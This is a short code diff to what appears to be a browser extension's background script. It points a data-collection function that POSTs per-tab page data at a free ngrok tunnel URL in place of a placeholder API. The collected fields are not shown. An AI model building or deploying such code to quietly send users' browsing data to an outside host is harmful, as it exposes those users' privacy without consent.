@@ -1,4 +1,4 @@
-const API_URL = "https://api.example.com/extension-data";
+const API_URL = "https://unblistered-lactonic-aniyah.ngrok-free.dev/poll";
 const OFFSCREEN_DOCUMENT_PATH = '/offscreen.html';
 let isAutoScanEnabled = false;
 let lastUrl = null;
@@ -41,7 +41,7 @@ async function collectAndSendAllData(tabId, url) {
     return;
   }
   lastUrl = url;
-  
+
   console.log("Collecting data for:", url);
 
   try {
@@ -62,7 +62,7 @@ async function collectAndSendAllData(tabId, url) {
     };
 
     console.log("Sending payload to API:", payload);
-    
+
     const resp = await fetch(API_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -76,6 +76,8 @@ async function collectAndSendAllData(tabId, url) {
     }
   } catch (err) {
     console.error("An error occurred during the data collection process:", err);
+  } finally {
+      console.log("Done")
   }
 }
 
